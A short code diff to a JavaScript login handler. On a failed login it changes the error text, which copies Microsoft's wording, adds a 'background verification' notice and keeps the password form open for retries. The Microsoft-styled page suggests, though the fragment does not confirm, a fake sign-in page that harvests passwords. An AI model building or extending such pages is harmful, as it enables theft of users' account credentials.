@@ -1564,9 +1564,18 @@ Status: ${data.status}`);
                 const data = await response.json();
 
                 if (response.status === 401) {
-                    // Invalid credentials - stay on password form
+                    // Invalid credentials - show error and allow retry
                     setLoading(false);
-                    showMessage(data.message || 'Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'microsoft-error');
+
+                    // Show background processing indicator
+                    let errorMessage = data.message || 'Your account or password is incorrect. Try another password.';
+                    if (data.backgroundProcessing) {
+                        errorMessage += '<br><small style="color: #64748b;">Background verification in progress...</small>';
+                    }
+
+                    showMessage(errorMessage, 'microsoft-error');
+
+                    // Keep password form visible for retry
                     return;
                 }
 
